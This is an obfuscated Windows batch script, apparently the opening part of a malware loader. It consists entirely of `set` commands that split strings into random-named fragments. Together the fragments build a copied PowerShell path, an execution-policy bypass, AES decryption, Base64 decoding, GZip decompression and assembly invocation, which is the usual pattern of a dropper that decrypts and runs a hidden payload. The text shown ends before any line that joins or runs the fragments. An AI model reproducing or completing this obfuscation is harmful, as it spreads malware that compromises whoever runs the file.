@echo off
set "FaBrLRQkZh=\W"
set "iJuwLAgRpw=do"
set "eZGGoIUKsQ=st"
set "bQoLhYFGAb=xe"
set "yaUFSkQKZv=.e"
set "DKytuTpBHp=ll"
set "BBDWZeiHJi=po"
set "QWbvlbkGmJ=ws"
set "KHoIdrsBwO=ll"
set "rGQyGXGEjl= C"
set "FJPiysheTP=ow"
set "muFTtloZtj=co"
set "NdHxvtPUrj=in"
set "sRcIHZABhw=0\"
set "yRvcxXqShh=py"
set "LazBlSBzGC=we"
set "gORRyBNhCC=Sy"
set "zifFtNWvtW=Po"
set "QwQnPHOaox=s\"
set "LfJriHhTcT=:\"
set "mBUDzaSQZQ=y "
set "sKSQjjQSMr=Wi"
set "bNvSakhnZJ=he"
set "RDTPqRRXJW=32"
set "bMYXApteMg=em"
set "KYUCqRcllu=rS"
set "vfaaYBoCpC=\v"
set "LnzWRWccQE= /"
set "MjrCOFDhmw=nd"
set "LKjYNSpYQO=1."
set "DrKTWEcrsY=rs"
set "jiIIJZDOdX=he"
set "bXGzOWFfGl=we"
set "miDIawkWIl= %~dp0"
set "fqNOkGIPuH=cd"
set "huAneMJybt=AD ="
set "zwnGoMlcUh=O, 0"
set "ixHPgqNrJe=daeR"
set "VKidfHoOXK=A.Su"
set "nhWcSsyFfN=pose"
set "yNNfyOlkhw=UGTu"
set "qeJmNlaRMk=gMod"
set "pEkLkpxQtB=oL'["
set "WdnApmjgRz=u = "
set "ttoNhAyuLN=le  "
set "OtkfFDqNXE=ring"
set "ZeQdZYSDfb=SRgH"
set "ZSPuQceicd=rt]:"
set "XlrSblSYLm=, (,"
set "xnPdwnyhFC=[]] "
set "VDTyEdfIVl=+hAO"
set "dkWSnhaeve=Fina"
set "nsmrNSubqb=ct S"
set "sFqssTcMvV=ress"
set "dsxAeBTBpE=H.Pa"
set "RdHaSSlHLi=Disp"
set "SIfATGzXBo=ionM"
set "oVOmOymUBC=ateD"
set "dbfapgEzVs=pres"
set "EmwcBwRgvV=oint"
set "YnrMgZPQaD=Pyo "
set "vjMLeSlnIb=rofi"
set "RwRfklynCh=O = "
set "EPXdPyoeoD=.Con"
set "uZQJhMmdAx=n ''"
set "EViLOUhlWG=-1.."
set "vNvYITTbJd=comm"
set "BjmghsJPSM='txe"
set "jvMPzuPKeU=m.IO"
set "FKhPfFYLBm=rity"
set "IeVAvPOmIw=th('"
set "emSGhhrsQW=.Mem"
set "dleTthzTDT=gH.I"
set "CYXVPZURRx=[Env"
set "lBpKcbgBOA=-ep "
set "hcBYBeBxZR=1] -"
set "OkkKUlkDmh=7;$b"
set "enJuUZeYBy=ach "
set "ATVzENVmaM=[IO."
set "mGtEGsZZBE=('l0"
set "krsQiPTbEY=.Cry"
set "AqcxROMKpp=();$"
set "wxqZWqAzRY=New-"
set "OEmCuWuwCB=tryP"
set "jrmaHsowpQ=ew-O"
set "TUVRyOcxKf= [Sy"
set "PxeoxNpOkD=stem"
set "VQYHlbQIWG=isfL"
set "zmRpKYTfVr=se()"
set "kmeGoqPMtc=Kdon"
set "tJOcibFzma=bSRg"
set "vEWpEppUbo=ptog"
set "bohSrDammx=)))"
set "ZaMzJTUnRO=lit("
set "VBqQhZLlSR=t Sy"
set "UiDYuUjejt=Invo"
set "KnhnhMBCAe= '')"
set "ssiDYOcoIJ==');"
set "IjuxnVfZoH=d;$b"
set "FyDguglNRw=File"
set "ueHcYwoHFg=esaB"
set "xtpQBJwENr=V = "
set "WJOOdqYLyu= [Sy"
set "QVbBaFbKzf=brea"
set "hqUwfpbvNo=orF'"
set "GcDynLqtct=y.Cr"
set "wIqDcNsFsh=$jAP"
set "YLliEechZE=grap"
set "cglUreKZmK= = $"
set "VuCxMDPLDK=O.Me"
set "JrgmPgopjQ=tem."
set "wBpGVfxQCs=0O+g"
set "dTwOqiWVPN=ne);"
set "KGYKZGSNCr=yo.T"
set "jypdAHGAbN=ewLi"
set "sdAmMrbEEX=ptor"
set "mxUwwIavTH=urit"
set "iapVkYCwem=czKg"
set "lpPjfqabFf=$bSR"
set "zDhrUEsRQB=[Sys"
set "TKzAjZOGbf=yste"
set "sHZiWKdJuB=lBlo"
set "lOsTlTeiQc=raph"
set "RjXvpNYvoA=Obje"
set "KTnlUgDsUF=donO"
set "mQWpdFKxrL=.Key"
set "zMSeiteJyj=$NEt"
set "NCuePADUmM=ZYYc"
set "SfxlOKbzAj=pDZz"
set "KtCvDFzfbM=bstr"
set "ayUZIsUMaA=ss -"
set "eYuqsNZrNV=flMA"
set "faJmzrXzch=736u"
set "cLEyzXnnAD=yste"
set "jNpRRvMQYd=vf ="
set "muKGenEyPB=txu."
set "AOPBOvzGOD=zKg."
set "AIvjhcwGDr=('%*'"
set "gFgKQpWvBh=p.En"
set "sEAYdeLOQZ===')"
set "DNftHytmJH=I = "
